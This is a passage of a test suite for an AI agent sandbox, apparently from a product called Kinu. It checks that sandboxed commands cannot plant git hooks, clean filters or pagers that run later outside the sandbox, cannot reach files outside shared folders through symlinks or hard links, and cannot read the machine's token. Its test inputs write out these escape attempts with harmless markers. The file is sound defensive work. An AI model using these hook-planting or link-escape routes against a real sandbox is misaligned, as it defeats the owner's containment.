    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-submodule');
    const [mono, source] = [path.join(home, 'mono'), path.join(home, 'ui-source')];

    for (const repo of [mono, source]) {
      await initialized(repo);
      expect((await owner(home, repo, ['commit', '-q', '--allow-empty', '-m', 'first'])).exitCode).toBe(0);
    }

    expect((await owner(home, mono, ['submodule', 'add', '-q', source, 'libs/ui'])).exitCode).toBe(0);
    expect((await owner(home, mono, ['config', 'core.hooksPath', 'libs/ui/.husky'])).exitCode).toBe(0);
    const ui = path.join(mono, 'libs', 'ui');

    const { printed } = await runIn(home, [ui], ui, plant('.husky/pre-commit'));

    expect(await owner(home, mono, ['commit', '-q', '-m', 'owner'])).toEqual({ exitCode: 0, planted: false });
    expect(printed).toEqual([]);
  });

  test('a bare repository holding the shared folder keeps its hooks, which the owner\'s push runs', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-bare');
    const [bare, clone] = [path.join(home, 'srv', 'project.git'), path.join(home, 'clone')];
    fs.mkdirSync(bare, { recursive: true });
    expect((await runToExit(['git', 'init', '-q', '--bare', bare], { env: gitEnv() })).exitCode).toBe(0);

    const { printed } = await runIn(home, [bare], bare, plant('hooks/post-receive'));

    expect((await owner(home, home, ['clone', '-q', bare, clone])).exitCode).toBe(0);
    expect((await owner(home, clone, ['commit', '-q', '--allow-empty', '-m', 'owner'])).exitCode).toBe(0);
    expect(await owner(home, clone, ['push', '-q', 'origin', 'HEAD'])).toEqual({ exitCode: 0, planted: false });
    expect(printed).toEqual([]);
  });

  test('a hooks directory the owner\'s global config names is read-only, with no repository in the shared folder', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-global-hooks');
    const [shared, other] = [path.join(home, 'shared'), path.join(home, 'other')];
    fs.mkdirSync(shared);
    fs.writeFileSync(path.join(home, '.gitconfig'), `[core]\n\thooksPath = ${path.join(shared, 'hooks')}\n`);
    await initialized(other);

    const { printed } = await runIn(home, [shared], shared, plant('hooks/pre-commit'));

    expect(await owner(home, other, ['commit', '-q', '--allow-empty', '-m', 'owner'])).toEqual({ exitCode: 0, planted: false });
    expect(printed).toEqual([]);
  });

  test('a clean filter\'s script in the shared folder is read-only, and the owner\'s git add runs the owner\'s', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-filter');
    const app = path.join(home, 'work', 'app');
    await initialized(app);
    fs.mkdirSync(path.join(app, 'tools'));
    fs.writeFileSync(path.join(app, 'tools', 'clean.sh'), '#!/bin/sh\ncat\n', { mode: 0o755 });
    fs.writeFileSync(path.join(app, '.gitattributes'), '*.txt filter=tidy\n');
    fs.writeFileSync(path.join(app, 'notes.txt'), 'notes\n');
    expect((await owner(home, app, ['config', 'filter.tidy.clean', './tools/clean.sh'])).exitCode).toBe(0);

    const { printed } = await runIn(home, [path.join(home, 'work')], app, 'printf "#!/bin/sh\\necho planted >&2\\ncat\\n" > tools/clean.sh && echo replaced');

    expect(await owner(home, app, ['add', 'notes.txt'])).toEqual({ exitCode: 0, planted: false });
    expect(printed).toEqual([]);
  });

  test('a pager the repository\'s config names in the shared folder is read-only, and git log pages through the owner\'s', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK || Bun.which('script') === null) return;
    const home = scratchDir('sandbox-pager');
    const app = path.join(home, 'work', 'app');
    const pager = path.join(app, 'tools', 'pager.sh');
    await initialized(app);
    fs.mkdirSync(path.dirname(pager));
    fs.writeFileSync(pager, '#!/bin/sh\ncat\n', { mode: 0o755 });
    expect((await owner(home, app, ['commit', '-q', '--allow-empty', '-m', 'first'])).exitCode).toBe(0);
    expect((await owner(home, app, ['config', 'core.pager', pager])).exitCode).toBe(0);

    const { printed } = await runIn(home, [path.join(home, 'work')], app, 'printf "#!/bin/sh\\necho planted\\ncat\\n" > tools/pager.sh && echo replaced');
    // A terminal, or git pages nothing.
    const paged = await runToExit(['script', '-qec', 'git -p log -1', '/dev/null'], { cwd: app, env: { HOME: home, PATH: process.env.PATH ?? '', TERM: 'dumb' } });

    expect({ exitCode: paged.exitCode, planted: paged.stdout.includes('planted') }).toEqual({ exitCode: 0, planted: false });
    expect(printed).toEqual([]);
  });

  test('a hooksPath set on its section\'s header line is read as git reads it', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-header-line');
    const repo = path.join(home, 'web');
    await initialized(repo);
    fs.appendFileSync(path.join(repo, '.git', 'config'), '[core] hooksPath = .husky\n');

    const { printed } = await runIn(home, [repo], repo, plant('.husky/pre-commit'));

    expect(printed).toEqual([]);
    expect(fs.existsSync(path.join(repo, '.husky', 'pre-commit'))).toBe(false);
  });

  test('a hooksPath the machine\'s system config names is read-only too', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-system-config');
    const repo = path.join(home, 'web');
    await initialized(repo);
    // Stands in for /etc/gitconfig: the git on this PATH reads its system config from here, as git reads it anywhere.
    const system = path.join(home, 'system-gitconfig');
    const shim = path.join(home, 'bin');
    fs.writeFileSync(system, '[core]\n\thooksPath = .syshooks\n');
    fs.mkdirSync(shim);
    fs.writeFileSync(path.join(shim, 'git'), `#!/bin/sh\nGIT_CONFIG_SYSTEM=${system} exec ${Bun.which('git')} "$@"\n`, { mode: 0o755 });
    const pathBefore = process.env.PATH;
    process.env.PATH = `${shim}:${pathBefore}`;

    try {
      const { printed } = await runIn(home, [repo], repo, plant('.syshooks/pre-commit'));

      expect(printed).toEqual([]);
      expect(fs.existsSync(path.join(repo, '.syshooks', 'pre-commit'))).toBe(false);
    } finally {
      process.env.PATH = pathBefore;
    }
  });

  test('a repository git refuses to read is named unguarded in the plan', async () => {
    const home = scratchDir('sandbox-refused');
    const work = path.join(home, 'work');
    const broken = path.join(work, 'broken');
    fs.mkdirSync(path.join(broken, '.git'), { recursive: true });
    fs.writeFileSync(path.join(broken, '.git', 'HEAD'), 'not a ref\n');

    const plan = await sandbox.plan({
      tier: 'sandboxed', platform: 'darwin', home, agentHome: path.join(home, '.kinu', 'agents', 'ws', 'home'),
      agentTmp: path.join(home, '.kinu', 'agents', 'ws', 'tmp'), deviceHome: path.join(home, '.kinu'), roots: [work], cwd: work, source: {}, command: 'true',
    });

    expect(plan.unguarded).toEqual([{ path: broken, why: expect.stringContaining('git refused to read it: ') }]);
  });

  test('a root past the walk\'s entry cap is named, so the model hears its repositories went unguarded', async () => {
    const home = scratchDir('sandbox-capped');
    const deviceHome = path.join(home, '.kinu');
    const agentHome = path.join(deviceHome, 'agents', 'ws', 'home');
    const huge = path.join(home, 'huge');
    const small = path.join(home, 'small');

    for (const dir of [agentHome, huge, small]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });

    for (let at = 0; at <= sandbox.GUARD_ENTRIES; at += 1) fs.writeFileSync(path.join(huge, String(at)), '');

    const plan = await sandbox.plan({
      tier: 'sandboxed', platform: 'darwin', home, agentHome, agentTmp: path.join(deviceHome, 'agents', 'ws', 'tmp'), deviceHome,
      roots: [huge, small], cwd: small, source: {}, command: 'true',
    });

    expect(plan.unguarded).toEqual([{ path: huge, why: `the sandbox stopped looking after ${String(sandbox.GUARD_ENTRIES)} entries` }]);
  });

  test('a startup file\'s hard link inside a writable root is refused, while the root\'s other files change', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-startup-link');
    const deviceHome = path.join(home, '.kinu');
    const agentHome = path.join(deviceHome, 'agents', 'ws', 'home');
    const agentTmp = path.join(deviceHome, 'agents', 'ws', 'tmp');
    const project = path.join(home, 'dotfiles');

    for (const dir of [agentHome, agentTmp, project]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
    fs.writeFileSync(path.join(home, '.bashrc'), 'owner-bashrc\n');
    fs.linkSync(path.join(home, '.bashrc'), path.join(project, 'bashrc'));

    const plan = await sandbox.plan({
      tier: 'sandboxed', home, agentHome, agentTmp, deviceHome, roots: [home, project], cwd: project, source: {},
      command: 'echo x >> bashrc && echo link-changed; echo notes > notes.txt && echo notes-written',
    });

    const run = spawnSync(plan.argv[0], plan.argv.slice(1), { env: plan.env, encoding: 'utf8' });

    expect(run.stdout.trim().split('\n')).toEqual(['notes-written']);
    expect(fs.readFileSync(path.join(home, '.bashrc'), 'utf8')).toBe('owner-bashrc\n');
  });


  // P1 (2026-10-22, reproduced on next-rc 506d98b77): a sandboxed command planted a hook in a shared repository, and the
  // owner's next commit, outside the sandbox, ran it.
  test('a hook planted in a shared repository never runs on the owner\'s next commit', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-hook');
    const repo = path.join(home, 'shop');
    const git = async (...args) => runToExit(['git', '-C', repo, '-c', 'user.name=o', '-c', 'user.email=o@example.com', ...args], { env: { PATH: process.env.PATH ?? '', HOME: home } });

    await initialized(repo);
    const { printed } = await runIn(home, [repo], repo, `${plant('.git/hooks/pre-commit')}; echo code > app.js && echo app-written`);
    const commit = await git('commit', '-q', '--allow-empty', '-m', 'owner');

    expect({ printed, exitCode: commit.exitCode, output: `${commit.stdout}${commit.stderr}` }).toEqual({ printed: ['app-written'], exitCode: 0, output: '' });
  });

});

/**
 * What a command may READ, run on this machine: the system trees a program
 * needs, its own home and tmp, and the directories the owner shared. A file a
 * person keeps anywhere else is outside the sandbox even when no home holds it.
 */
describe('a sandboxed command reads only the system and what the owner shared', () => {
  /** A file outside every home and every consented directory: `/var/tmp` is on
   *  every Linux, world-writable, and no home or root holds it. */
  function plantOutsideEveryHome(label) {
    const planted = path.join('/var/tmp', `kinu-sandbox-${label}-${process.pid}`);
    fs.writeFileSync(planted, 'outside-every-root', { mode: 0o600 });

    return planted;
  }

  test('a file outside the homes and the consented directory is invisible, however it is spelled', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const planted = plantOutsideEveryHome('outside');
    const base = scratchDir('sandbox-outside');
    const consented = path.join(base, 'consented');
    fs.mkdirSync(consented, { recursive: true });
    fs.symlinkSync(planted, path.join(consented, 'escape'));

    try {
      const run = await runSandboxed(
        `cat ${JSON.stringify(planted)} 2>&1; cat ${JSON.stringify(path.join(consented, 'escape'))} 2>&1; echo done`,
        { roots: [consented] },
      );

      expect(run.stdout).not.toContain('outside-every-root');
      expect(run.stdout).toContain('done');
    } finally {
      fs.rmSync(planted, { force: true });
    }
  });

  test('Kinu\'s own directory stays hidden inside a consented directory that holds it', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    // `kinu connect` run in the home makes the home the consented directory,
    // and ~/.kinu holds this machine's token and the owner's CLI bearer.
    const home = scratchDir('sandbox-root-home');
    const deviceHome = path.join(home, '.kinu');
    const agentHome = path.join(deviceHome, 'agents', 'ws', 'home');
    const agentTmp = path.join(deviceHome, 'agents', 'ws', 'tmp');

    for (const dir of [agentHome, agentTmp]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
    fs.writeFileSync(path.join(deviceHome, 'device.json'), '{"token":"pdt_machine_secret"}', { mode: 0o600 });
    fs.writeFileSync(path.join(home, 'shared.txt'), 'shared-with-the-agent');

    const plan = await sandbox.plan({
      tier: 'sandboxed', home, agentHome, agentTmp, deviceHome, roots: [home],
      cwd: home, command: `cat ${JSON.stringify(path.join(deviceHome, 'device.json'))} ${JSON.stringify(path.join(home, 'shared.txt'))} 2>&1`, source: {},
    });

    const run = await runToExit(plan.argv, { env: plan.env });

    expect(run.stdout).not.toContain('pdt_machine_secret');
    expect(run.stdout).toContain('shared-with-the-agent');
  });

  test('/var/tmp is the agent\'s own temp, as /tmp is', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const run = await runSandboxed('printf agent-temp > /var/tmp/kinu-agent-temp && cat /tmp/kinu-agent-temp');

    expect(run.stdout).toBe('agent-temp');
    expect(fs.readFileSync(path.join(run.agentTmp, 'kinu-agent-temp'), 'utf8')).toBe('agent-temp');
  });

  test('a GPU job sees the same GPUs inside the sandbox as outside', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;

    // A machine with no NVIDIA driver has no GPU job to keep.
    if (Bun.which('nvidia-smi') === null) return;

    const outside = await runToExit(['nvidia-smi', '-L']);

    if (outside.exitCode !== 0) return;
    // NVML reads /sys to find the devices; a sandbox without it answers
    // "GPU access blocked by the operating system" (measured 2026-09-22,
    // driver 595.84, RTX 4080).
    const inside = await runSandboxed('nvidia-smi -L');

    expect(inside.stderr).toBe('');
    expect(inside.stdout).toBe(outside.stdout);
  });

  test('a toolchain under /opt is there inside the sandbox, byte for byte and executable', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    // ROCm, Arch's CUDA and conda install a GPU job's runtime under /opt.
    const found = await runToExit(['find', '/opt', '-maxdepth', '4', '-type', 'f', '-perm', '-u+x', '-print', '-quit']);
    const tool = found.stdout.trim();

    // A machine with nothing installed under /opt has no such job to keep.
    if (tool === '') return;
    const probe = `test -x ${JSON.stringify(tool)} && sha256sum ${JSON.stringify(tool)}`;
    const outside = await runToExit(['bash', '-c', probe]);
    const inside = await runSandboxed(probe);

    expect(inside.stderr).toBe('');
    expect(inside.stdout).toBe(outside.stdout);
  });

  test('/opt is readable and read-only to the file methods, as to the shell', () => {
    if (!LINUX || !fs.existsSync('/opt')) return;
    const home = scratchDir('view-opt');

    const policy = sandbox.viewFor({
      platform: 'linux', home, agentHome: path.join(home, '.kinu', 'agents', 'ws', 'home'),
      agentTmp: path.join(home, '.kinu', 'agents', 'ws', 'tmp'), deviceHome: path.join(home, '.kinu'), roots: [],
    });

    expect(policy.resolvePath('/opt/rocm/bin/rocminfo', 'read')).toBe('/opt/rocm/bin/rocminfo');
    expect(() => policy.resolvePath('/opt/rocm/bin/planted', 'write')).toThrow('read-only');
  });

  test('the command environment never names Kinu\'s own directory', () => {
    const env = sandbox.sandboxEnvironment({ PATH: '/usr/bin', KINU_HOME: '/var/lib/kinu' }, {});

    expect(env.PATH).toBe('/usr/bin');
    expect(Object.values(env)).not.toContain('/var/lib/kinu');
  });
});

describe('one policy, two enforcers', () => {
  const view = () => sandbox.viewFor({
    platform: 'linux',
    home: '/home/dev',
    agentHome: '/home/dev/.kinu/agents/ws-1/home',
    agentTmp: '/home/dev/.kinu/agents/ws-1/tmp',
    deviceHome: '/home/dev/.kinu',
    roots: ['/home/dev/work/client', '/srv/shared'],
  });

  test('a path the sandbox cannot see is a path the file methods refuse', () => {
    const policy = view();

    for (const invisible of ['/home/other/notes', '/home/dev/notes.md', '/root/.ssh/id_rsa', '/run/user/1000/keyring', '/mnt/c/Users/me/x']) {
      expect(policy.classify(invisible).access).toBe(sandbox.VIEW_INVISIBLE);
      expect(() => policy.resolvePath(invisible, 'read')).toThrow('does not expose');
    }
  });

  const writablePaths = [
    {
      // The owner's home outside the consented roots is not the agent's.
      name: 'the agent home is its own path, to the file methods as to the command',
      asked: '/home/dev/.kinu/agents/ws-1/home/notes.md',
      outside: '/home/dev/.kinu/agents/ws-1/home/notes.md',
    },
    {
      name: 'a consented root under the home is itself, not the agent home',
      asked: '/home/dev/work/client/main.py',
      outside: '/home/dev/work/client/main.py',
    },
  ];

  for (const writable of writablePaths) {
    test(writable.name, () => {
      const policy = view();
      expect(policy.resolvePath(writable.asked, 'write')).toBe(writable.outside);
      expect(policy.insidePath(writable.outside)).toBe(writable.asked);
    });
  }

  test('Kinu\'s own directory is refused by its own path, the agent home inside it excepted', () => {
    const elsewhere = sandbox.viewFor({
      platform: 'linux',
      home: '/home/dev',
      agentHome: '/var/lib/kinu/agents/ws-1/home',
      agentTmp: '/var/lib/kinu/agents/ws-1/tmp',
      deviceHome: '/var/lib/kinu',
      roots: [],
    });

    expect(() => elsewhere.resolvePath('/var/lib/kinu/config.json', 'read')).toThrow('inside Kinu\'s own directory');
    // The agent home under it is still reachable: the fence is the store, not
    // the prefix.
    expect(elsewhere.resolvePath('/var/lib/kinu/agents/ws-1/home/x', 'write')).toBe('/var/lib/kinu/agents/ws-1/home/x');
    expect(() => view().resolvePath('/home/dev/.kinu/config.json', 'read')).toThrow('inside Kinu\'s own directory');
    expect(() => view().resolvePath('/home/dev/.kinu/agents/ws-2/home/notes.md', 'read')).toThrow('inside Kinu\'s own directory');
  });

  test('the file methods refuse what the shell is refused in a consented home and a repository, each naming why', async () => {
    const home = scratchDir('view-home-guarded');
    const project = path.join(home, 'work', 'shop');
    fs.mkdirSync(project, { recursive: true });
    expect((await runToExit(['git', 'init', '-q', project], { env: gitEnv() })).exitCode).toBe(0);
    fs.writeFileSync(path.join(home, '.bashrc'), 'owner-bashrc');
    fs.writeFileSync(path.join(home, 'notes.txt'), 'owner-notes');
    fs.linkSync(path.join(home, '.bashrc'), path.join(project, 'bashrc'));

    const policy = sandbox.viewFor({
      platform: 'linux', home, agentHome: path.join(home, '.kinu/agents/ws-1/home'), deviceHome: path.join(home, '.kinu'), roots: [home],
    });

    // As a write method does it: the path judged on arrival, then the guard asked in its queue, right before it acts.
    const refusal = async (target) => {
      try {
        await policy.refuseGuarded(policy.resolvePath(target, 'write'));

        return null;
      } catch (error) {
        return error.message;
      }
    };

    expect(await refusal(path.join(home, '.bashrc'))).toContain('a shell startup file');
    expect(await refusal(path.join(project, 'bashrc'))).toContain('a shell startup file');
    expect(await refusal(path.join(home, '.bash_profile'))).toContain(`Create it inside an existing folder instead, e.g. ${path.join(home, 'projects')}/…`);

    for (const kept of ['.git/hooks/pre-commit', '.git/config']) {
      expect(await refusal(path.join(project, kept))).toContain('runs outside the sandbox');
    }

    expect({ notes: await refusal(path.join(home, 'notes.txt')), readme: await refusal(path.join(project, 'README.md')), head: await refusal(path.join(project, '.git', 'HEAD')) })
      .toEqual({ notes: null, readme: null, head: null });

    expect(policy.resolvePath(path.join(home, '.bashrc'), 'read')).toBe(path.join(home, '.bashrc'));
    expect(policy.resolvePath(path.join(home, 'notes.txt'), 'write')).toBe(path.join(home, 'notes.txt'));
    expect(policy.resolvePath(path.join(project, 'README.md'), 'write')).toBe(path.join(project, 'README.md'));
    expect(policy.resolvePath(path.join(project, '.git', 'HEAD'), 'write')).toBe(path.join(project, '.git', 'HEAD'));
  });

  test('the system trees are readable and refuse a write, like the kernel', () => {
    const policy = view();
    expect(policy.resolvePath('/usr/lib/libc.so', 'read')).toBe('/usr/lib/libc.so');
    expect(() => policy.resolvePath('/usr/lib/planted.so', 'write')).toThrow('read-only');
  });
});

describe('the file methods read what the command reads', () => {
  const home = scratchDir('view-home');
  const deviceHome = path.join(home, '.kinu');
  const agentHome = path.join(deviceHome, 'agents', 'ws-1', 'home');
  const agentTmp = path.join(deviceHome, 'agents', 'ws-1', 'tmp');
  const consented = path.join(home, 'work');

  for (const dir of [agentHome, agentTmp, consented]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });

  const view = () => sandbox.viewFor({ platform: 'linux', home, agentHome, agentTmp, deviceHome, roots: [consented] });

  test('a file outside the system trees and the shared directories is refused, even for a read', () => {
    // /dev/shm: outside every home, every temp root and every system tree, and
    // writable on every Linux, so the refusal cannot be a missing file.
    const planted = path.join('/dev/shm', `kinu-view-outside-${process.pid}`);
    const climb = `${consented}/${'../'.repeat(consented.split('/').filter(Boolean).length)}${planted.slice(1)}`;
    fs.writeFileSync(planted, 'outside-every-root', { mode: 0o600 });

    try {
      expect(() => view().resolvePath(planted, 'read')).toThrow('does not expose');
      expect(() => view().resolvePath(climb, 'read')).toThrow('does not expose');
    } finally {
      fs.rmSync(planted, { force: true });
    }
  });

  test('a link the agent planted in its own home is judged by where it lands', () => {
    const secret = path.join(home, 'owner-secret.txt');
    fs.writeFileSync(secret, 'owner-private-material', { mode: 0o600 });
    fs.symlinkSync(secret, path.join(agentHome, 'escape'));

    // The entry is the agent's own and points at the owner's real file:
    // serving it would read what the shell never sees.
    expect(() => view().resolvePath(path.join(agentHome, 'escape'), 'read')).toThrow('does not expose');
  });

  test('a dangling link is judged by where a write through it would land', () => {
    // A write follows a final link even when its target is absent, and creates the target: the sandboxed shell can
    // plant such a link in a consented folder, so the file methods must decide on the target, not the link.
    const outside = path.join('/dev/shm', `kinu-view-dangling-${process.pid}`);
    const inside = path.join(consented, 'landed.txt');
    fs.symlinkSync(path.join(outside, 'new.txt'), path.join(consented, 'dangling'));
    fs.symlinkSync('dangling', path.join(consented, 'chained'));
    fs.symlinkSync(inside, path.join(consented, 'kept'));
    fs.symlinkSync(outside, path.join(consented, 'dangling-dir'));
    fs.symlinkSync('loop-b', path.join(consented, 'loop-a'));
    fs.symlinkSync('loop-a', path.join(consented, 'loop-b'));

    expect(() => view().resolvePath(path.join(consented, 'dangling'), 'write')).toThrow('does not expose');
    expect(() => view().resolvePath(path.join(consented, 'chained'), 'write')).toThrow('does not expose');
    expect(() => view().resolvePath(path.join(consented, 'dangling-dir', 'new.txt'), 'write')).toThrow('does not expose');
    expect(view().resolvePath(path.join(consented, 'kept'), 'write')).toBe(inside);
    expect(() => view().resolvePath(path.join(consented, 'loop-a'), 'write')).toThrow('symbolic links');
    expect(fs.existsSync(outside)).toBe(false);
  });

  test('a dangling link into Kinu\'s own directory is refused with the Sandbox switch off', () => {
    const raw = sandbox.rawViewFor({ platform: 'linux', deviceHome });
    fs.symlinkSync(path.join(deviceHome, 'planted-device.json'), path.join(consented, 'into-kinu'));

    expect(() => raw.resolvePath(path.join(consented, 'into-kinu'), 'write')).toThrow('inside Kinu');
  });

  test('the system trees stay readable and the agent\'s temp answers for /var/tmp', () => {
    expect(view().resolvePath('/etc/hostname', 'read')).toBe('/etc/hostname');
    expect(() => view().resolvePath('/etc/kinu-planted', 'write')).toThrow('read-only');
    expect(view().resolvePath('/var/tmp/scratch.txt', 'write')).toBe(path.join(agentTmp, 'scratch.txt'));
  });
});

describe('the macOS profile, as generated text', () => {
  const profile = () => sandbox.buildMacProfile(sandbox.viewFor({
    platform: 'darwin',
    home: '/Users/dev',
    agentHome: '/Users/dev/.kinu/agents/ws-1/home',
    agentTmp: '/Users/dev/.kinu/agents/ws-1/tmp',
    deviceHome: '/Users/dev/.kinu',
    roots: ['/Users/dev/work/client'],
  }));

  test('denies the user\'s home and re-allows only the agent home and the roots', () => {
    const text = profile();
    expect(text).toContain('(deny default)');
    expect(text).toContain('(deny file-read* file-write* (subpath "/Users") (subpath "/Volumes") (subpath "/private/var/root"))');
    // The re-allow must come AFTER the deny: SBPL takes the last matching rule,
    // which is the whole mechanism this profile relies on.
    expect(text.indexOf('(allow file-read* file-write* (subpath "/Users/dev/.kinu/agents/ws-1/home")'))
      .toBeGreaterThan(text.indexOf('(deny file-read* file-write* (subpath "/Users")'));
    expect(text).toContain('(subpath "/Users/dev/work/client")');
  });

  test('a consented home still denies Kinu\'s own directory, then re-allows the agent\'s', () => {
    const text = sandbox.buildMacProfile(sandbox.viewFor({
      platform: 'darwin',
      home: '/Users/dev',
      agentHome: '/Users/dev/.kinu/agents/ws-1/home',
      agentTmp: '/Users/dev/.kinu/agents/ws-1/tmp',
      deviceHome: '/Users/dev/.kinu',
      roots: ['/Users/dev'],
    }));

    const rootAllowed = text.indexOf('(subpath "/Users/dev")');
    const kinuDenied = text.indexOf('(deny file-read* file-write* (subpath "/Users/dev/.kinu"))');

    // Last match wins: the deny must follow the root that holds ~/.kinu, and
    // the agent's own directories inside it must follow the deny.
    expect(kinuDenied).toBeGreaterThan(rootAllowed);
    expect(text.lastIndexOf('(subpath "/Users/dev/.kinu/agents/ws-1/home")')).toBeGreaterThan(kinuDenied);
  });

  test('names no path the owner did not consent, and keeps the GPU clients', () => {
    const text = profile();
    expect(text).not.toContain('/Users/dev/.ssh');
    expect(text).not.toContain('/Users/dev/Library');
    expect(text).toContain('AGXDeviceUserClient');
    expect(text).toContain('IOSurfaceRootUserClient');
    expect(text).toContain('com.apple.MTLCompilerService');
    expect(text).toContain('(allow network*)');
  });

  test('the plan spawns sandbox-exec with HOME pointed at the agent home', async () => {
    const plan = await sandbox.plan({
      tier: 'sandboxed', platform: 'darwin', home: '/Users/dev',
      agentHome: '/Users/dev/.kinu/agents/ws-1/home',
      agentTmp: '/Users/dev/.kinu/agents/ws-1/tmp',
      deviceHome: '/Users/dev/.kinu', roots: [], command: 'echo hi',
      cwd: '/Users/dev/.kinu/agents/ws-1/home', source: {},
    });

    expect(plan.argv[0]).toBe('/usr/bin/sandbox-exec');
    expect(plan.argv[1]).toBe('-p');
    expect(plan.argv.slice(-3)).toEqual(['bash', '-c', 'echo hi']);
    // No mount namespace on macOS, so HOME is the only thing that can point a
    // tool's defaults at the agent's own directory.
    expect(plan.env.HOME).toBe('/Users/dev/.kinu/agents/ws-1/home');
    expect(plan.env.KINU_SANDBOX).toBe('1');
  });
});
